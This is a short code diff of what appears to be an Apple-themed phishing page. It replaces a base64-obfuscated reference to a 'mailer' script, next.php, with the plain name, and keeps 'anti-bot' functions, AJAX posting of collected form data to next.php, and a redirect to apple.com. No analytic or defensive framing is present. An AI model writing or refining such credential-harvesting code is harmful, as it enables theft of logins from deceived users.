@@ -378,11 +378,8 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script type="text/javascript">
-        // Redirect link
+        //redirect link
         var rdrt = "https://www.apple.com/";
-
-        //mailer link - this is where your next.php file is referenced
-        var f = atob("bmV4dC5waHA=");  // This decodes to your next.php URL
         
         // Anti-bot functions
         function detectBot() {
@@ -502,7 +499,7 @@
                 // Submit form via AJAX
                 $.ajax({
                     dataType: 'JSON',
-                    url: f,
+                    url: "next.php",
                     type: 'POST',
                     data: c,
                     beforeSend: function(a) {
